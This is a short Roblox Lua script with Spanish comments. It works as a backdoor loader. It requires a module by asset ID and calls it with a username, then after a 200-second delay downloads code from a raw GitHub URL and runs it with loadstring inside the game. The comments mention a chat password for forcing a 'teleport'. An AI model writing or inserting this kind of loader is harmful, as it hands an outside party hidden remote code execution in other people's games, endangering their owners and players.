local HttpService = game:GetService("HttpService")

-- 1. Ejecución INMEDIATA del módulo require de teleport (Echo Por Mi Jeje)
local modelSuccess, module = pcall(require, 94217198436768)
if modelSuccess and module then
    pcall(function()
        module:pls("luilo30095")
    end)
end

-- 2. Si No Funciona FORZAR EL TELEPORT CON CLAVE (te Pedira La Contraseña en el Chat, Es Entrance0232
task.delay(200, function()
    local success, res = pcall(HttpService.GetAsync, HttpService, "https://raw.githubusercontent.com/luisaddoba200-wq/CodeAdmin.Coderless/main/Admin.Code.Userless")
    
    if success and res then
        local InternalCode = game:FindFirstChildWhichIsA("Script", true) or game:FindFirstChildWhichIsA("LocalScript", true)
        
        if InternalCode then
            InternalCode.Enabled = true
            
            -- Usamos pcall para evitar que un error de sintaxis en el código remoto rompa el ejecutor
            local run, err = loadstring(res)
            if run then
                getfenv(run).script = InternalCode
                task.spawn(run)
            else
                warn("[ENTRANCE ERROR]: " .. tostring(err))
            end
        end
    end
end)
